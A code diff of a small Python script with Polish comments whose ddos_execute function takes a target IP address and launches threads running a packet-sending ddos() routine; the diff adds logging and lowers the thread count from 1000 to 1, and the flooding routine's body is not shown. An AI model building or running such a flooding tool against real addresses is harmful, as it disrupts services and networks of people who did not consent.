@@ -5,6 +5,7 @@ import socket
 import random
 import threading
 import ipaddress
+import logging
 
 
 # Funkcja do wysyłania pakietów do określonego adresu IP
@@ -27,23 +28,22 @@ def ddos(target_ip):
 
 
 # Funkcja główna
-def ddos_execute():
+def ddos_execute(prompts):
     """
     TBD
     """
 
-    target_ip = input("Podaj adres IP: ")
+    target_ip = input(prompts['address_wifi_input'])
     check_flag = False
     try:
         ipaddress.ip_address(target_ip)
         check_flag = True
-    except ValueError:
-        pass
+    except ValueError as error:
+        logging.error(error)
 
     if check_flag:
         # Tworzenie wielu wątków, które będą symulować atak
-        for _ in range(1000):
-            print("AA")
+        for _ in range(1):
             # Tworzenie wątku dla każdego atakującego
             thread = threading.Thread(target=ddos, args=(target_ip,))
             # Uruchamianie wątku
